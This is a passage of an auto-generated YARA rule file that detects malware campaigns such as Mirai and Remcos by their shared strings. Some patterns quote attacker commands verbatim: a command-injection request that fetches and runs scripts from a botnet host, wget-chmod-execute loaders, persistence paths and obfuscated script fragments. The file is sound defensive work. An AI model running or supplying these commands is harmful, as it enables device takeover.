        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-a401ad4f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "%sone%08X.tmp" ascii
        $s1 = "lstrcpyA" ascii
        $s2 = "ARIESONE" ascii
        $s3 = "lstrcatA" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 4 of them
}

rule Sightlines_host_6933c2fb_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-6933c2fb"
        date = "2026-10-20"
        campaign = "host-6933c2fb"
        family = ""
        hash = "05cebfa73485dadf802c473571183eda70aecd9766136c7c1af666987bcb6461"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-6933c2fb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "nohup bash \"$TARGET_DIR/tokenlinux.sh\" > /dev/null 2>&1 &" ascii
        $s1 = "mv \"$TARGET_DIR/end_activator\" \"$TARGET_DIR/end.sh\"" ascii
        $s2 = "chmod +x \"$TARGET_DIR/start.sh\" \"$TARGET_DIR/end.sh\"" ascii
        $s3 = "mv \"$TARGET_DIR/start_activator\" \"$TARGET_DIR/start.sh\"" ascii
        $s4 = "chmod +x \"$TARGET_DIR/tokenlinux.sh\"" ascii
        $s5 = "bash \"$TARGET_DIR/start.sh\"" ascii
        $s6 = "TARGET_DIR=\"$HOME/.cache\"" ascii
        $s7 = "echo \"Authenticated\"" ascii
        $s8 = "#!/bin/bash" ascii
        $s9 = "  exit 1" ascii
    condition:
        filesize < 1048576 and 10 of them
}

rule Sightlines_tlsh_695aa8e5_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-695aa8e5"
        date = "2026-10-15"
        campaign = "tlsh-695aa8e5"
        family = "mirai"
        hash = "074d7d9fa0a9111bdc15f1c6f88001a3f45c468e0ae7f67df9501b1ad1c70ec5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-695aa8e5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s1 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s2 = "ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT" ascii
        $s3 = "((unsigned long) chunk2mem (brk) & MALLOC_ALIGN_MASK) == 0" ascii
        $s4 = "info[DT_RELAENT]->d_un.d_val == sizeof (ElfW(Rela))" ascii
        $s5 = "WARNING: ld.so: invalid GLIBC_TUNABLES `%s': ignored." ascii
        $s6 = "info[DT_RELRENT]->d_un.d_val == sizeof (ElfW(Relr))" ascii
        $s7 = "info[DT_RELENT]->d_un.d_val == sizeof (ElfW(Rel))" ascii
        $s8 = "version == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST)" ascii
        $s9 = "(char *) chunk2mem (p) + 2 * CHUNK_HDR_SZ <= paligned_mem" ascii
        $s10 = "chunksize_nomask (p) == (0 | PREV_INUSE)" ascii
        $s11 = "robust || (oldval & FUTEX_OWNER_DIED) == 0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1195864 and 12 of them
}

rule Sightlines_tlsh_2e1fc9ff_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-2e1fc9ff"
        date = "2026-10-18"
        campaign = "tlsh-2e1fc9ff"
        family = ""
        hash = "6d2de1fb1a561c2e19e4a91894cb6bee1bc045ecff9d20eaf48488500bf577d8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-2e1fc9ff.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "$Id: UPX 3.96 Copyright (C) 1996-2020 the UPX Team. All Rights Reserved. $" ascii
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $" ascii
        $s2 = "C3$24C5$26C7$28C9$!" ascii
        $s3 = "Ka7TaggtiTGXlllS" ascii
        $s4 = "J#Paok1EPum$U/" ascii
        $s5 = "h fil]or.Xir`" ascii
        $s6 = "-TCjX flSYAK" ascii
        $s7 = "mgRTFSuBPX[\\" ascii
        $s8 = "_;mulkxYcp-Y" ascii
        $s9 = "BwiAeUQ2o[}" ascii
        $s10 = "TAL: kerm4l" ascii
        $s11 = "?rGKkmeo0B" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_417d2328_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-417d2328"
        date = "2026-10-18"
        campaign = "tlsh-417d2328"
        family = ""
        hash = "1fac02a405615d392e3ca0b0e706f3f27c5b64dcc1e690d175c37fe0f71742b3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-417d2328.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "$Id: UPX 4.22 Copyright (C) 1996-2024 the UPX Team. All Rights Reserved. $" ascii
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $" ascii
        $s2 = " !9999\"#$%9999&'()9999*+,-9999./0199992345999967899999:;<=9999>?@A9999BCDE9999FGHI9999JKLM9999NOPQ99" ascii
        $s3 = "MNOrrrrPRTUrrrrVWYZrrrr[\\_`rrrrabcdrrrrefhi9rrrjk" ascii
        $s4 = "(!PROT_EXEC|PROT_WRITE failed." ascii
        $s5 = "9999 \"$%9999&/56999979:<9999DGHI9999_`ab9999c" ascii
        $s6 = "'\\/`iMiM7d?hiMiMGlOpiMiMWt_x" ascii
        $s7 = "sion.skip_lock_after_retrl" ascii
        $s8 = "GCC: (Ubuntu 12.4.0-2u" ascii
        $s9 = "Wo3hJHr5jfDKYmvLOyT" ascii
        $s10 = "'Wr%C345%Wr%67`%Wr89." ascii
        $s11 = "_X3.4-1968//TR\"LI" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_82ae44d4_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-82ae44d4"
        date = "2026-10-18"
        campaign = "tlsh-82ae44d4"
        family = ""
        hash = "29a83b42da804b056da99a8de958f9243a3b06250ac7c19ed96929e29db7b0b8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-82ae44d4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "$Id: UPX 4.22 Copyright (C) 1996-2024 the UPX Team. All Rights Reserved. $" ascii
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $" ascii
        $s2 = " !\"NNNN#$%&NNNN'()*NNNN+,-.NNNN/012NNNN3456NNNN789:NNNN;<=>NNNN?@ABNNNNCDEFNNNNGHIJNNNNKLMNNNNNOPQRN" ascii
        $s3 = "9QRST9999UVWX9999YZ[\\9999]^_`9999abcd9999efgh9999ijkl9999mnop9999qrst9999uvwx9999yz{|9999}~" ascii
        $s4 = " 9999!\"#$9999%&'(9999)*+,9999-./0999912349999567899999:;<9999=>?@9999ABCD9999EFGH9999IJKL9999MNOP999" ascii
        $s5 = "@9999ABCD9999EFGH9999IJKL9999MNOQ9999RSTU9999VWXY9999Z[\\^9999_jkr9999stu" ascii
        $s6 = "F'J/BkBkN7R?BkBkVGZOBkBk^Wb_<oBkfgj" ascii
        $s7 = " rrrr!\"#$rrrr%&'(rrrr)*+,rrrr-./0rrrr1234rrrr5678rrrr9:;<" ascii
        $s8 = "PROT_EXEC|PROT_WRITE failed." ascii
        $s9 = "5'IOWo3hJHr5jfDKYmvL/x" ascii
        $s10 = "'GLOBAL_OFFSET_TABLE_u" ascii
        $s11 = "3D3K3M3N3O3Y3[6$6%6&[y" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_host_1db65dc7_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-1db65dc7"
        date = "2026-10-18"
        campaign = "host-1db65dc7"
        family = "mirai"
        hash = "006fe5e7d106546adda59d96a9509bc7ca21757c0b5d22c3f44565182652bba4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-1db65dc7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/usr/local/bin/bash" ascii
        $s1 = "/usr/bin/busybox" ascii
        $s2 = "/data/local/tmp" ascii
        $s3 = "/tmp/.Kdat_tmp" ascii
        $s4 = "/usr/bin/bash" ascii
        $s5 = "/usr/bin/sh" ascii
        $s6 = ".comment" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 2114176 and 6 of them
}

rule Sightlines_tlsh_a5032f4d_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a5032f4d"
        date = "2026-10-18"
        campaign = "tlsh-a5032f4d"
        family = "mirai"
        hash = "204e6d14591590ac52bc5c342ceb5ca87abdaa90d29b6e7cd1c84ebc291e7c5a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a5032f4d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/proc/self/oom_score_adj" ascii
        $s1 = "/etc/config/resolv.conf" ascii
        $s2 = "/etc/config/hosts" ascii
        $s3 = "Restart=always" ascii
        $s4 = "[kworker/0:1]" ascii
        $s5 = "ExecStart=%s" ascii
        $s6 = "/etc/rc.local" ascii
        $s7 = "[Service]" ascii
        $s8 = "E8H;E0wrH" ascii
        $s9 = "tcpbypass" ascii
        $s10 = "AWAVAUATUL" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 7 of them
}

rule Sightlines_tlsh_18a0c52c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-18a0c52c"
        date = "2026-10-18"
        campaign = "tlsh-18a0c52c"
        family = ""
        hash = "2ff9ff956650c6180b0f64bdf389e36cc4eb4eb4fc28cd6be716f43c1b083a06"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-18a0c52c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "$Id: UPX 3.96 Copyright (C) 1996-2020 the UPX Team. All Rights Reserved. $" ascii
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $" ascii
        $s2 = "PROT_EXEC|PROT_WRITE failed." ascii
        $s3 = "GCC: (Ubuntu 11.4.0-1u" ascii
        $s4 = "hk@hIBC_2.3.4nKVp" ascii
        $s5 = "pthread_mutex_loc" ascii
        $s6 = "GLOBAL_OFFSET_TABL" ascii
        $s7 = "3D3K3M*3O3Y3[6$6%" ascii
        $s8 = "Sjuantech54Fl" ascii
        $s9 = "inc9recLfaileC" ascii
        $s10 = " SOCKS5 on :%d" ascii
        $s11 = "feUco>47450</" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_86dfe4b1_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-86dfe4b1"
        date = "2026-10-18"
        campaign = "tlsh-86dfe4b1"
        family = ""
        hash = "114efbd42d4180d0489ea83b7514dc90406f43f684e0de206c534e97f8c9d221"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-86dfe4b1.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "$Id: UPX 3.96 Copyright (C) 1996-2020 the UPX Team. All Rights Reserved. $" ascii
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $" ascii
        $s2 = ",-./0123456789:;<=>?@ABCDEFGHIJKw" ascii
        $s3 = "b'cdWr%Wefg%Wr%hir%WrjklWr%Wmno%Wr%pqr%WrrstWr%Wuvw%Wr%xyr%WrzABWr%WCDE%Wr%FGr%WrHIJWr%WKLM%Wr%NOr%W" ascii
        $s4 = " !\"rrrr#$%&rrrr'()*rrrr+,-.rrrr/012rrrr3456rrrr789:rrrr;<=>rrrr?@ABrrrrCDEFrrrrGHIJrrrrKLMNrrrrOPQRr" ascii
        $s5 = "PQRSNNNNTVWXNNNNYZ[\\NNNN]^_`NNNNabcdNNNNefghNNNNijklNNNNmnopNNNNqrstNNNNuvwxNNNNyz{|NNNN}~" ascii
        $s6 = " !\"9999#$%&9999'()*9999+,-.9999/012999934569999789:9999;<=>9999?@AB9999CDEF9999GHIJ9999KLMN9999OQRS9" ascii
        $s7 = "NNNN !\"#NNNN$%&'NNNN()*+NNNN,-./NNNN0123NNNN4567NNNN89:;NNNN<=>?NNNN@ABCNNNNDEFGNNNNHIJKNNNNLMNONNNN" ascii
        $s8 = "rrrSTUVrrrrWXYZrrrr[\\]^rrrr_`abrrrrcdefrrrrghijrrrrklmnrrrropqrrrrrstuvrrrrwxyzrrrr{|}~rrrr" ascii
        $s9 = "<>@BDhMh=F'JhMhM/N7RhMhM?VGZhMhMO^Wb" ascii
        $s10 = "PROT_EXEC|PROT_WRITE failed." ascii
        $s11 = "999TUVW9999XYZ[9999\\^_j9999krst9999u" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_host_a88d674c_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-a88d674c"
        date = "2026-10-22"
        campaign = "host-a88d674c"
        family = "mirai"
        hash = "00d0db4d3dbc46ce64f493b6d0df48a2c8e3b2c4c514a1f5159b8d2c8828cb8f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-a88d674c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "action_mode=SETROOTCERTIFICATE&cert_fname=cert.pem&cert_data=\";cd /tmp;wget http://minefox.lol/bins/" ascii
        $s1 = "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,diffie-hellman-" ascii
        $s2 = "mig.sh http://$H/bins/kla.sh 2>/dev/null ||    busybox wget -q -O .mig.sh http://$H/bins/kla.sh 2>/d" ascii
        $s3 = "cd /tmp; wget http://minefox.lol/bins/kla.sh -O k 2>/dev/null; chmod +x k 2>/dev/null; ./k" ascii
        $s4 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s5 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s6 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s7 = "chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@ope" ascii
        $s8 = "group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group14-sha256" ascii
        $s9 = "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8" ascii
        $s10 = "en sh .mig.sh 2>/dev/null; rm -f .mig.sh 2>/dev/null; break; fi; done; rm -f .mig.sh 2>/dev/null" ascii
        $s11 = "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_rich_header_hash_6af59d76_remcosrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-6af59d76"
        date = "2026-10-17"
        campaign = "rich_header_hash-6af59d76"
        family = "remcosrat"
        hash = "342c8cbca7f6c97acbd974963ad9909b9864cf0643244f4565593d8b67b893f1"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-6af59d76.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "https://pro.ip-api.com/line/?key=QPVvv1rHQJD2pd2&fields=25948155" wide
        $s1 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" ascii
        $s2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" ascii
        $s3 = "CreateObject(\"WScript.Shell\").Run \"cmd /c \"\"" wide
        $s4 = "Set fso = CreateObject(\"Scripting.FileSystemObject\")" wide
        $s5 = "CreateObject(\"Scripting.FileSystemObject\").DeleteFile(Wscript.ScriptFullName)" wide
        $s6 = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders" wide
        $s7 = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\" wide
        $s8 = "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall" ascii
        $s9 = "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" wide
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" wide
        $s11 = "C6858E06B70404E9CD9E3ECB662395B4429C648139053FB521F828AF606B4D3DBAA14B5E77EFE75928FE1DC127A2FFA8DE33" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1502288 and 12 of them
}

rule Sightlines_tlsh_4e2a2ff6_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-4e2a2ff6"
        date = "2026-10-17"
        campaign = "tlsh-4e2a2ff6"
        family = ""
        hash = "30a27eaf23cbec3ad0817f339ac43655aed23c96d047d0791d5d8a5db1fba2a5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-4e2a2ff6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "        'W47dN09jW4nAhSkkBvLJzCoAlu9lW5dcQ3KhjWNcL1nvWRjuW5H7nZddVCoPW6rlvCkWWQG'," ascii
        $s1 = "        'yCo6W6LbW73dUbBcPSkHWQNdTCo7W5VcVcZcHLBcLSk6W6NdRNddS8kYW5ZdKwXokCoIWQjgW4uLr1TRW5O'," ascii
        $s2 = "_0x14d7c0] = _0x38d82e, _0x3821ba += String['fromCharCode'](_0x1daf17['charCodeAt'](_0x3479ca) ^ _0x" ascii
        $s3 = "        'wdFdP27cO0RcL8oLiSo7n2b0BmkkzCk0W5KNW5ldR8k1W7/cTfvy'," ascii
        $s4 = "0x1140ba, _0x242679++ % 0x4) ? _0x238764 += String['fromCharCode'](0xff & _0x11774c >> (-0x2 * _0x24" ascii
        $s5 = "XObject(_0x1714ab(0x25)), _0x377284 = new ActiveXObject(_0x522091(0x27));" ascii
        $s6 = "        'qSo2W6XnW7/dVXFcRCkQW6VcNCo3W4/cVf/dKKVcJCkVWQtcJhFdQCo3W53dNa'," ascii
        $s7 = "h[_0x1484f9(0x50, 'mY!u')]()['toString'](0x24)[_0x1af0aa(0x23)](0x2, 0xa)[_0x37da08(0x1d)]();" ascii
        $s8 = "    _0xbe362c[_0x59725f(0x7, 'KsBQ')](), this[_0x522091(0x13)] = _0xbe362c;" ascii
        $s9 = "_0x5bb3e4 = _0x2f60['tEkoJG'](_0x5bb3e4, _0x2f6070), _0x2f60['LwDoBx'][_0x1aa0d4] = _0x5bb3e4) : _0x" ascii
        $s10 = "    var _0x3e91be = _0x4de8a3, _0x136d28 = new ActiveXObject(_0x522091(0x4)), _0x20cea2 = new Active" ascii
        $s11 = "function _0x5d5e(_0x180d4f, _0x38978a) {" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_4f993e69_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-4f993e69"
        date = "2026-10-17"
        campaign = "imphash-4f993e69"
        family = ""
        hash = "2ce6a4a50f9862f7338d077f9cefd90a02997c28add53588ad0e43c74bf750a7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-4f993e69.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "6d0da78}\"/><supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/></application></compatibility><" ascii
        $s1 = "ortedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/><supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f" ascii
        $s2 = "_ZTVNSt6thread11_State_implINS_8_InvokerISt5tupleIJZN7orchard11ripen_asyncERKNSt7__cxx1112basic_stri" ascii
        $s3 = "*NSt6thread11_State_implINS_8_InvokerISt5tupleIJZN7orchard11ripen_asyncERKNSt7__cxx1112basic_stringI" ascii
        $s4 = "_ZNSt6thread11_State_implINS_8_InvokerISt5tupleIJZN7orchard11ripen_asyncERKNSt7__cxx1112basic_string" ascii
        $s5 = "_ZTINSt6thread11_State_implINS_8_InvokerISt5tupleIJZN7orchard11ripen_asyncERKNSt7__cxx1112basic_stri" ascii
        $s6 = "_ZTSNSt6thread11_State_implINS_8_InvokerISt5tupleIJZN7orchard11ripen_asyncERKNSt7__cxx1112basic_stri" ascii
        $s7 = "<compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\"><application><supportedOS Id=\"{e20" ascii
        $s8 = "11457-1546-43c5-a5fe-008deee3d3f0}\"/><supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/><supp" ascii
        $s9 = ".pdata$_ZNK12_GLOBAL__N_121system_error_category10equivalentEiRKSt15error_condition" ascii
        $s10 = ".xdata$_ZNK12_GLOBAL__N_121system_error_category10equivalentEiRKSt15error_condition" ascii
        $s11 = ".pdata.unlikely._ZNSt12_GLOBAL__N_1L14__throw_syserrEiPKc" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 7660322 and 12 of them
}

rule Sightlines_imphash_dd85b31b_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-dd85b31b"
        date = "2026-10-16"
        campaign = "imphash-dd85b31b"
        family = ""
        hash = "2c08e77f86b0953cffa505bdbe64e87ecb7c088db65d5acb9a2eee65a32565ef"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-dd85b31b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "(Press Retry to debug the application - JIT must be enabled)" ascii
        $s1 = "failure, see the Visual C++ documentation on asserts" ascii
        $s2 = "api-ms-win-core-kernel32-legacy-l1-1-1.dll" ascii
        $s3 = "api-ms-win-core-processthreads-l1-1-0.dll" ascii
        $s4 = "api-ms-win-core-processenvironment-l1-1-0.dll" ascii
        $s5 = "api-ms-win-core-errorhandling-l1-1-0.dll" ascii
        $s6 = "api-ms-win-core-processthreads-l1-1-1.dll" ascii
        $s7 = "api-ms-win-core-libraryloader-l1-1-0.dll" ascii
        $s8 = "Assertion failed: %Ts, file %Ts, line %d" ascii
        $s9 = "api-ms-win-core-localization-l1-2-0.dll" ascii
        $s10 = "For information on how your program can cause an assertion" ascii
        $s11 = "api-ms-win-core-interlocked-l1-1-0.dll" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2746656 and 12 of them
}

rule Sightlines_imphash_3c5e4aaa_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-3c5e4aaa"
        date = "2026-10-16"
        campaign = "imphash-3c5e4aaa"
        family = ""
        hash = "184146852727a9db4eea06178716bec3cdbb1015c911f6b0f915b184ad7775b2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-3c5e4aaa.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "svbfloat16" ascii
        $s1 = "svfloat16" ascii
        $s2 = "svfloat32" ascii
        $s3 = "svfloat64" ascii
        $s4 = "svuint16" ascii
        $s5 = "svuint32" ascii
        $s6 = "svuint64" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 7 of them
}

rule Sightlines_tlsh_4ee03782_remcosrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-4ee03782"
        date = "2026-10-17"
        campaign = "tlsh-4ee03782"
        family = "remcosrat"
        hash = "710482ef543f6dadf62abd92b4216e18aba48cad65829186fc5c6974d0b852c8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-4ee03782.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "https://pro.ip-api.com/line/?key=QPVvv1rHQJD2pd2&fields=25948155" wide
        $s1 = "Copyright (c) by P.J. Plauger, licensed by Dinkumware, Ltd. ALL RIGHTS RESERVED." ascii
        $s2 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" ascii
        $s3 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" ascii
        $s4 = "CreateObject(\"WScript.Shell\").Run \"cmd /c \"\"" wide
        $s5 = "Set fso = CreateObject(\"Scripting.FileSystemObject\")" wide
        $s6 = "CreateObject(\"Scripting.FileSystemObject\").DeleteFile(Wscript.ScriptFullName)" wide
        $s7 = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders" wide
        $s8 = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\" wide
        $s9 = "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall" ascii
        $s10 = "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" wide
        $s11 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1502288 and 12 of them
}

rule Sightlines_imphash_9071c961_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-9071c961"
        date = "2026-10-17"
        campaign = "imphash-9071c961"
        family = ""
        hash = "172cb9ab2e82ead2757946af852df3e8569cb0ce4dbc9229f7b7e38cedaed11f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-9071c961.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/> " ascii
        $s1 = "      <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/> " ascii
        $s2 = "      <!--The ID below indicates application support for Windows 8.1 -->" ascii
        $s3 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s4 = "      <!--The ID below indicates application support for Windows 10 -->" ascii
        $s5 = "      <!--The ID below indicates application support for Windows 7 -->" ascii
        $s6 = "      <!--The ID below indicates application support for Windows 8 -->" ascii
        $s7 = "      <!--The ID below indicates application support for Windows Vista -->" ascii
        $s8 = "        <requestedExecutionLevel level=\"asInvoker\"/>" ascii
        $s9 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." ascii
        $s10 = "Partial loss of significance (PLOSS)" ascii
        $s11 = "Total loss of significance (TLOSS)" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_host_dda7b873_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-dda7b873"
        date = "2026-10-22"
        campaign = "host-dda7b873"
        family = "mirai"
        hash = "103a43615769b391c9db64c43d48b02247da7563f15ec5f7e5ec8c9ee24715c7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-dda7b873.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,diffie-hellman-" ascii
        $s1 = "mig.sh http://$H/bins/kla.sh 2>/dev/null ||    busybox wget -q -O .mig.sh http://$H/bins/kla.sh 2>/d" ascii
        $s2 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s3 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s4 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s5 = "chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@ope" ascii
        $s6 = "group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group14-sha256" ascii
        $s7 = "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8" ascii
        $s8 = "en sh .mig.sh 2>/dev/null; rm -f .mig.sh 2>/dev/null; break; fi; done; rm -f .mig.sh 2>/dev/null" ascii
        $s9 = "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3" ascii
        $s10 = "umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@ope" ascii
        $s11 = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_b49b9096_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-b49b9096"
        date = "2026-10-16"
        campaign = "tlsh-b49b9096"
        family = ""
        hash = "3ea03e28c0a5a8c8a4910f26b2a1ee073053f76cbd9d21729dcec81543ac1617"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-b49b9096.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "aR3nbf8dQp2feLmk31.lSfgApatkdxsVcGcrktoFd.resources" ascii
        $s1 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s2 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s3 = "Brzina vodenog kola: Prosjek 14.8 o/min (vrh 18.2)" wide
        $s4 = "Efektivni raspon plime danas: {0:0.00} m (Sizik: {1:0.00} m | Kvadratura: {2:0.00} m)" wide
        $s5 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s6 = "Iskoristivost mljevenja: {0:0.1}% fino bra" wide
        $s7 = "Brzina vodenog kola: Prosjek {0:0.1} o/min (vr" wide
